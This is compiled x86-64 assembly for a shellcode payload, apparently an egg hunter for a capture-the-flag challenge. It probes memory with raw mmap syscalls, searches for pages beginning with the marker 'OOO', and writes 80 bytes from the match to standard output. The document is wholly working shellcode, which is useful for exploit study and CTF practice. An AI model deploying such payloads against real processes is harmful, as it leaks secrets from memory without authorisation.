	.file	"shellcode.c"
	.text
	.type	sys_munmap, @function
_start:
	pushq	%r15
	pushq	%r14
	xorl	%r15d, %r15d
	pushq	%r13
	pushq	%r12
	pushq	%rbp
	pushq	%rbx
	movabsq	$17592186044416, %rbp
	subq	$24, %rsp
	movl	$100, 20(%rsp)
.L5:
	xorl	%ebx, %ebx
	orq	$-1, %r13
.L14:
	xorl	%r12d, %r12d
	movq	$131072, (%rsp)
.L9:
	movq	(%rsp), %rax
	decq	%rax
	cmpq	%r12, %rax
	jbe	.L26
	movq	(%rsp), %rax
	movq	%rbp, %rdi
	movl	$3, %edx
	movl	$34, %r14d
	addq	%r12, %rax
	shrq	%rax
	movq	%rax, %rsi
	movq	%rax, 8(%rsp)
	movl	$9, %eax
	salq	$12, %rsi
#APP
# 4064 "linux-syscall-support/linux_syscall_support.h" 1
	movq %r14,%r10;movq %r13,%r8;movq %r15,%r9;syscall

# 0 "" 2
#NO_APP
	cmpq	$-4096, %rax
	movq	%rax, %rdi
	jbe	.L6
	movq	%r13, %rdi
.L6:
	cmpq	%rdi, %rbp
	jne	.L7
	movq	%rbp, %rdi
	call	sys_munmap
	movq	8(%rsp), %r12
	jmp	.L8
.L7:
	call	sys_munmap
	movq	8(%rsp), %rax
	movq	%rax, (%rsp)
.L8:
	movq	(%rsp), %rax
	decq	%rax
	cmpq	%r12, %rax
	jne	.L9
	salq	$12, %r12
	movl	$4096, %esi
	movl	$9, %eax
	leaq	0(%rbp,%r12), %rbx
	movl	$3, %edx
	movl	$34, %ebp
	movq	%rbx, %rdi
#APP
# 4064 "linux-syscall-support/linux_syscall_support.h" 1
	movq %rbp,%r10;movq %r13,%r8;movq %r15,%r9;syscall

# 0 "" 2
#NO_APP
	cmpq	$-4096, %rax
	movq	%rax, %rdi
	jbe	.L10
	movq	%r13, %rdi
.L10:
	cmpq	%rdi, %rbx
	movl	$4096, %esi
	jne	.L11
	movq	%rbx, %rdi
	call	sys_munmap
	xorl	%eax, %eax
	jmp	.L12
.L11:
	call	sys_munmap
	movl	$1, %eax
	jmp	.L12
.L26:
	movq	%rbx, %rbp
	jmp	.L14
.L12:
	testl	%eax, %eax
	movq	%rbx, %rbp
	je	.L14
	cmpb	$79, (%rbx)
	jne	.L16
	cmpb	$79, 1(%rbx)
	jne	.L16
	cmpb	$79, 2(%rbx)
	jne	.L16
	movl	$1, %eax
	movl	$1, %edi
	movl	$80, %edx
	movq	%rbx, %rsi
#APP
# 3553 "linux-syscall-support/linux_syscall_support.h" 1
	syscall

# 0 "" 2
#NO_APP
	jmp	.L4
.L16:
	decl	20(%rsp)
	leaq	4096(%rbx), %rbp
	jne	.L5
	movl	$231, %eax
	movl	$2, %edi
#APP
# 3374 "linux-syscall-support/linux_syscall_support.h" 1
	syscall

# 0 "" 2
#NO_APP
.L4:
	addq	$24, %rsp
	popq	%rbx
	popq	%rbp
	popq	%r12
	popq	%r13
	popq	%r14
	popq	%r15
	ret
	.size	_start, .-_start
sys_munmap:
	movl	$11, %eax
#APP
# 3454 "linux-syscall-support/linux_syscall_support.h" 1
	syscall

# 0 "" 2
#NO_APP
	movq	$-1, %rdx
	cmpq	$-4095, %rax
	cmovnb	%rdx, %rax
	ret
	.size	sys_munmap, .-sys_munmap
	.globl	_start
	.type	_start, @function
	.ident	"GCC: (Ubuntu 7.4.0-1ubuntu1~18.04) 7.4.0"
	.section	.note.GNU-stack,"",@progbits
